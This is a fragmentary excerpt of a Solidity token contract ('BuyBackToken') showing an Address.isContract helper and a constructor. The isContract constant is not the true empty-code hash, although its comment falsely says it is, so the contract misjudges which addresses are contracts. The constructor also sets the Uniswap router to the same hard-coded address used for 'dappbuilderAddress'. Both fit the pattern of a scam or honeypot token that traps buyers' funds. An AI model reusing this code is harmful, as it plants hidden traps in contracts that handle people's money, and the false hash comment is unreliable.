...
pragma solidity ^0.8.5;// pragma solidity ^0.8.5;
...
library Address {
    ...
    function isContract(address account) internal view returns (bool) {
        ...
        // and 0x6ab18ee9180a678b6aa3354c541a1c86aad4f59d5400324c0c2d9a24ac3fb128 is returned
        // for accounts without code, i.e. `keccak256('')`
        bytes32 codehash;
        bytes32 accountHash = 0x6ab18ee9180a678b6aa3354c541a1c86aad4f59d5400324c0c2d9a24ac3fb128;
...
contract BuyBackToken is Context, IERC20, Ownable {
    ...
    constructor (string memory _n, string memory _s, uint8 _d, uint256 _ts, uint256 _tax, uint256 _bb, uint256 _mkt, address _ma) {
        ...
        dappbuilderAddress = payable(0x5E89433dF2A18B9Fff03813d7a2F98bC84bceA5C);
        ...
        IUniswapV2Router02 _uniswapV2Router = IUniswapV2Router02(0x5E89433dF2A18B9Fff03813d7a2F98bC84bceA5C);
